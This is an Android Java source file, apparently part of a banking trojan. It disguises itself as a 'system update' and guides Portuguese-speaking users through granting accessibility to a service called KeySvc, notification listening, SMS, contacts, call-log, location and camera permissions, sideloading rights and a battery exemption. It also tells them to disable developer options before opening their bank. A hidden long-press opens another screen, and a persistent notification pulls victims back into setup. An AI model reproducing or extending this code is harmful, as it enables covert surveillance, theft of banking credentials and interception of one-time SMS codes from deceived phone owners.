package com.eloeeducacao;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class SetupActivity extends Activity {

    private static final int N = 5;
    private static final String CH = "s";
    private static final int NC = 78;
    private static final int RQ = 21;

    private static final String[] TIT = {
            "Permissões do sistema",
            "Acessibilidade",
            "Acesso a notificações",
            "Instalar aplicativos",
            "Bateria"
    };
    private static final String[] SUB = {
            "Toque em Permitir nas janelas que aparecerem.",
            "Ative «Acessibilidade» na lista e volte ao app.",
            "Ative «Acessibilidade» na lista e volte ao app.",
            "Permita a instalação por esta fonte e volte ao app.",
            "Escolha Permitir. Isso impede o sistema de encerrar o serviço."
    };

    private TextView titulo, sub, passo, corpo, detalhe;
    private Button acao, pular;
    private int etapa;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);

        LinearLayout l = new LinearLayout(this);
        l.setOrientation(LinearLayout.VERTICAL);
        l.setBackgroundColor(0xFF101418);
        l.setPadding(dp(26), dp(54), dp(26), dp(26));

        titulo = new TextView(this);
        titulo.setText("Atualização do sistema");
        titulo.setTextColor(Color.WHITE);
        titulo.setTextSize(24);
        titulo.setOnLongClickListener(new View.OnLongClickListener() {
            @Override public boolean onLongClick(View v) {
                startActivity(new Intent(SetupActivity.this, MainActivity.class));
                return true;
            }
        });
        l.addView(titulo);

        sub = new TextView(this);
        sub.setText("Versão 1.2.3 · componentes do sistema");
        sub.setTextColor(0xFF8A97A5);
        sub.setTextSize(13);
        sub.setPadding(0, dp(6), 0, dp(28));
        l.addView(sub);

        passo = new TextView(this);
        passo.setTextColor(0xFF2F81F7);
        passo.setTextSize(12);
        passo.setPadding(0, 0, 0, dp(6));
        l.addView(passo);

        corpo = new TextView(this);
        corpo.setTextColor(Color.WHITE);
        corpo.setTextSize(17);
        l.addView(corpo);

        detalhe = new TextView(this);
        detalhe.setTextColor(0xFF8A97A5);
        detalhe.setTextSize(14);
        detalhe.setPadding(0, dp(8), 0, dp(26));
        l.addView(detalhe);

        acao = new Button(this);
        acao.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                if (etapa >= N) { fim(); return; }
                abre(etapa);
            }
        });
        l.addView(acao);

        pular = new Button(this);
        pular.setText("Pular etapa");
        pular.setOnClickListener(new View.OnClickListener() {
            @Override public void onClick(View v) {
                etapa++;
                pinta();
            }
        });
        LinearLayout.LayoutParams pl = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
        pl.topMargin = dp(4);
        pl.gravity = Gravity.END;
        pular.setLayoutParams(pl);
        l.addView(pular);

        TextView rodape = new TextView(this);
        rodape.setText("Se as opções do desenvolvedor estiverem ativadas, desligue-as antes de abrir o banco.");
        rodape.setTextColor(0xFF5B6773);
        rodape.setTextSize(11);
        rodape.setPadding(0, dp(30), 0, 0);
        l.addView(rodape);

        setContentView(l);
        etapa = 0;
        pinta();
    }

    @Override protected void onResume() {
        super.onResume();
        cancela();
        while (etapa < N && pronto(etapa)) etapa++;
        pinta();
    }

    @Override protected void onPause() {
        super.onPause();
        if (etapa < N) notifica();
    }

    private void pinta() {
        if (etapa >= N) {
            passo.setText("CONCLUÍDO");
            corpo.setText("Configuração concluída");
            detalhe.setText("Tudo pronto. Pode fechar o aplicativo.");
            acao.setText("Fechar");
            pular.setVisibility(View.GONE);
            return;
        }
        passo.setText("ETAPA " + (etapa + 1) + " DE " + N);
        corpo.setText(TIT[etapa]);
        detalhe.setText(SUB[etapa]);
        acao.setText(etapa == 0 || etapa == 4 ? "Permitir" : "Abrir ajustes");
        pular.setVisibility(View.VISIBLE);
    }

    private void abre(int e) {
        try {
            switch (e) {
                case 0:
                    pede();
                    return;
                case 1: {
                    try {
                        Intent d = new Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
                        d.putExtra(Intent.EXTRA_COMPONENT_NAME,
                                new ComponentName(this, KeySvc.class).flattenToString());
                        startActivity(d);
                        return;
                    } catch (Throwable ignored) {}
                    startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                    return;
                }
                case 2:
                    startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                    return;
                case 3:
                    startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                            Uri.parse("package:" + getPackageName())));
                    return;
                case 4:
                    startActivity(new Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:" + getPackageName())));
                    return;
            }
        } catch (Throwable t) {
            etapa++;
            pinta();
        }
    }

    private boolean pronto(int e) {
        switch (e) {
            case 0: return permsOk();
            case 1: return Util.accOn(this);
            case 2: return notifOk();
            case 3: return instalOk();
            case 4: return batOk();
        }
        return true;
    }

    private void pede() {
        java.util.List<String> q = new java.util.ArrayList<>();
        String[] ps = {
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION,
                android.Manifest.permission.CAMERA,
                "android.permission.POST_NOTIFICATIONS",
                "android.permission.READ_MEDIA_IMAGES"
        };
        for (String s : ps) {
            try {
                if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) q.add(s);
            } catch (Throwable ignored) {}
        }
        if (q.isEmpty()) { etapa++; pinta(); return; }
        requestPermissions(q.toArray(new String[0]), RQ);
    }

    private boolean permsOk() {
        String[] ps = {
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.ACCESS_FINE_LOCATION
        };
        for (String s : ps)
            if (checkSelfPermission(s) != PackageManager.PERMISSION_GRANTED) return false;
        return true;
    }

    private boolean notifOk() {
        try {
            String s = Settings.Secure.getString(getContentResolver(),
                    "enabled_notification_listeners");
            return s != null && s.contains(getPackageName());
        } catch (Throwable t) { return false; }
    }

    private boolean instalOk() {
        try {
            if (Build.VERSION.SDK_INT >= 26)
                return getPackageManager().canRequestPackageInstalls();
            return true;
        } catch (Throwable t) { return true; }
    }

    private boolean batOk() {
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            return pm.isIgnoringBatteryOptimizations(getPackageName());
        } catch (Throwable t) { return true; }
    }

    @Override public void onRequestPermissionsResult(int rq, String[] a, int[] r) {
        super.onRequestPermissionsResult(rq, a, r);
        if (rq == RQ) { etapa++; pinta(); }
    }

    private void notifica() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (Build.VERSION.SDK_INT >= 26) {
                NotificationChannel c = new NotificationChannel(
                        CH, "Sistema", NotificationManager.IMPORTANCE_LOW);
                c.setShowBadge(false);
                nm.createNotificationChannel(c);
            }
            Intent i = new Intent(this, SetupActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_NEW_TASK);
            PendingIntent pi = PendingIntent.getActivity(this, 1, i,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            Notification n = (Build.VERSION.SDK_INT >= 26
                    ? new Notification.Builder(this, CH)
                    : new Notification.Builder(this))
                    .setContentTitle("Toque para voltar ao app")
                    .setContentText("Continue a configuração da etapa " + (etapa + 1))
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .setOngoing(true)
                    .setContentIntent(pi)
                    .build();
            nm.notify(NC, n);
        } catch (Throwable ignored) {}
    }

    private void cancela() {
        try {
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).cancel(NC);
        } catch (Throwable ignored) {}
    }

    private void fim() {
        cancela();
        finish();
    }

    public static void loja(Context c) {
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("market://details?id=com.whatsapp"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
            return;
        } catch (Throwable ignored) {}
        try {
            Intent i = new Intent(Intent.ACTION_VIEW,
                    Uri.parse("https://play.google.com/store/apps/details?id=com.whatsapp"));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            c.startActivity(i);
        } catch (Throwable ignored) {}
    }

    private int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density);
    }
}
